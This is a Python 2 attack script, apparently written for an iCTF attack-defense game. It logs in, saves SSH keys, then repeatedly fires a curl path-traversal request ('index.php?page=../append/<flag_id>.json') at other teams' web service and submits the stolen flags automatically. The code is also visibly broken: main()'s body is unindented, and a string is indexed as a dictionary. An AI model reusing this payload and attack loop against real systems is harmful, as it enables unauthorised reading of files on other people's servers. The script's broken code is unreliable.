from ictf import iCTF
import os
import time
# import paramiko
import json, ast
import thread
import subprocess

def attack_web(t, service, target):
    IP = '172.31.129.'
    host = target['hostname']
    host = host[4:]
    hostIp = IP + host
    flagId = target['flag_id']
    try:
    	#Write the command here using which you can attack the other teams
        command = 'curl ' + str(hostIp) + ':' + str(target['port']) + '/index.php?page=../append/' + str(flagId)+'.json'
        proc = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()

      	output = out['message']
        
        out = out.strip()
        try:
            t.submit_flag([out])
        except:
            pass
    except Exception as e:
        print e


def main():

# Reading config file

with open('config.json') as json_data_file:
    config = json.load(json_data_file)


# Login to iCTF server and get ssh keys of our server
ictf = iCTF(config["ctf_ip"])
t = ictf.login(config["team_id"],config["team_pass"])
key_info = t.get_ssh_keys()
print json.dumps(key_info, indent=4, sort_keys=True)

with open('ctf_key', 'wb') as f:
    f.write(key_info['ctf_key'])

with open('root_key', 'wb') as f:
    f.write(key_info['root_key'])

chmod_command = "chmod 600 ctf_key"
os.system(chmod_command)
chmod_command = "chmod 600 root_key"
os.system(chmod_command)

while(True):
    services= t.get_service_list()
    for service in services:
        targets=t.get_targets(service['service_id'])
        for target in targets["targets"]:
        	#if service is 10003, it is the web service
            if service['service_id']==10003:
                thread.start_new_thread(attack_web, (t,service, target))

    time.sleep(config["delay"])


if __name__ == '__main__':
	main()